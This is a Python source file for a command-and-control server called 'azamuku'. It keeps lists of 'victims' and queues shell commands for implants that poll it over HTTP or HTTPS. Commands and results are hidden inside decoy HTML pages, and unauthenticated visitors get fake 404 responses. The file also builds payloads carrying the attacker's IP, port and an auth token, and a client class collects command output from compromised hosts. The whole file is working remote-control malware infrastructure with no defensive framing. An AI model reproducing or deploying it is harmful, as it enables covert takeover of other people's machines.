from http.server import BaseHTTPRequestHandler, HTTPServer
import ssl
import threading
import time
import random
import os

"""
written by otter - github.com/whatotter
"""

vicInfo = {} # info of victims
connects = [] # victims that actually connected back
endpoints = [] # endpoints that mirror the pool
authorized = [] # authorized uids that can connect to azamuku
commandPool = {} # command pool of commands - "UID": "command"
responsePool = {} # response pool of previous commands - "UID": "respnose"
enableGrab = False # enable grabbing old sessions (destroys the entire authentication thing)
h = "Authorization" # header to grab for authentication
# ^ its like a staircase, so cool


class azamukuHandler(BaseHTTPRequestHandler):
    def _send_response(self, status_code=200, content_type='text/html'):
        self.send_response(status_code)
        self.send_header('Content-type', content_type)
        self.end_headers()

    def alternatingEndpoint(self, comment:str, mask=random.choice(os.listdir("./core/masks/html"))):
        f = open(os.path.join("./core/masks/html/", mask), "r").read()
        f = f.replace("%()%", comment)
        return f.encode('ascii')

    def do_GET(self):
        global authorized, endpoints, commandPool, responsePool, connects, enableGrab, h
        auth = self.headers.get(h, None).strip()

        if self.path == "/e030d4f6":
            if auth in authorized:
                if auth not in list(connects):
                    connects.append(auth)

                self._send_response()
                a = random.choice(endpoints).encode('ascii')
                self.wfile.write(a)
                return
                
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return
            

        if self.path[1:] in endpoints: # if its a *command pool endpoint*


            if auth == None:
                self._send_response(404)
                self.wfile.write(b'Not Found')
                return
            else:
                if auth in authorized:
                    if auth not in list(connects):
                        connects.append(auth)

                    self._send_response()
                    if auth in list(commandPool):
                        self.wfile.write(self.alternatingEndpoint("!"+commandPool[auth]))
                        return
                    else:
                        self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints)))
                        return
                else:
                    if not enableGrab:
                        self._send_response(404)
                        self.wfile.write(b'Not Found')
                    else:
                        print("\n[+] grabbed unauthenticated UID '{}' and added to authorized, since grab was enabled".format(auth))
                        connects.append(auth)
                        self._send_response()
                        self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints))) # make the client rerun the request again

                    return

        else:
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return

    def do_POST(self):
        global authorized, endpoints, commandPool, responsePool, h
        body = self.rfile.read(int(self.headers['Content-Length'])).decode('ascii')
        auth = self.headers.get(h, None)

        if self.path[1:] in endpoints: # if its a *command pool endpoint*


            if auth == None:
                self._send_response(404)
                self.wfile.write(b'Not Found')
                return
            else:
                if auth in authorized:
                    self._send_response()
                    ep = random.choice(endpoints).encode('ascii')
                    self.wfile.write(ep)

                    if auth in list(commandPool):
                        if len(body) != 0:
                            responsePool[auth] = ''.join([chr(int(x)) for x in body.split(' ')]).strip()
                        else:
                            responsePool[auth] = ''
                        commandPool.pop(auth)

                    return
                else:
                    self._send_response(404)
                    self.wfile.write(b'Not Found')
                    return

        else:
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return
        
    def log_message(self, format, *args):
        return

class azamuku:
    def __init__(self) -> None:
        self.endpoints = []

        self.httpServer = None
        self.httpsServer = None
        pass

    def run_http(self, ip, server_class=HTTPServer, handler_class=azamukuHandler, port=80):
        httpd = server_class((ip, port), handler_class)
        self.httpServer = httpd
        httpd.serve_forever()

    def run_https(self, ip, server_class=HTTPServer, handler_class=azamukuHandler, port=443, certfile='server.pem'):
        httpd = server_class((ip, port), handler_class)
        httpd.socket = ssl.wrap_socket(httpd.socket, certfile=certfile, server_side=True)

        self.httpsServer = httpd
        httpd.serve_forever()


    def set_endpoints(self, file="./core/masks/endpoints.txt"):
        global endpoints
        for x in open(file, "r").readlines():
            self.endpoints.append(x.strip())
            endpoints.append(x.strip())

        return True
    
    def start(self, ip, httpPort=80, httpsPort=443, certfile='server.pem'):
        self.set_endpoints()

        if httpPort != 0:
            threading.Thread(target=self.run_http, args=(ip,), kwargs={"port": httpPort}, daemon=True).start()

            while self.httpServer == None: # wait for server to go up
                time.sleep(0.1)

        if httpsPort != 0:
            threading.Thread(target=self.run_https, args=(ip,), kwargs={"port": httpsPort, "certfile":certfile}, daemon=True).start()

            while self.httpsServer == None: # wait for server to go up
                time.sleep(0.1)

        return True

    def stop(self):
        if self.httpServer != None:
            self.httpServer.shutdown()

        if self.httpsServer != None:
            self.httpsServer.shutdown()
        return True
    
    
class payload:
    def genUID(y=32, chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        global authorized
        uid = ''.join([random.choice(chars) for x in range(y)])
        authorized.append(uid)
        return uid
    
    def generatePayload(ip, port, payloadFile):
        global endpoints
        uid = payload.genUID()
        replaces = {
            "%ip%": ip,
            "%port%": port,
            "%auth%": uid,
            "%startpool%": random.choice(endpoints)
        }

        payloadData = open(os.path.join("./core/payloads/", payloadFile), "r").read()
        for x,y in replaces.items():
            payloadData = payloadData.replace(x, y)

        return payloadData

class client:
    def __init__(self, uid) -> None:
        self.uid = uid
        pass

    def run(self, command:str):
        global commandPool, responsePool
        
        commandPool[self.uid] = command
        while True:
            if self.uid in list(responsePool):
                response = responsePool[self.uid]
                responsePool.pop(self.uid)
                return response
            else:
                time.sleep(0.1)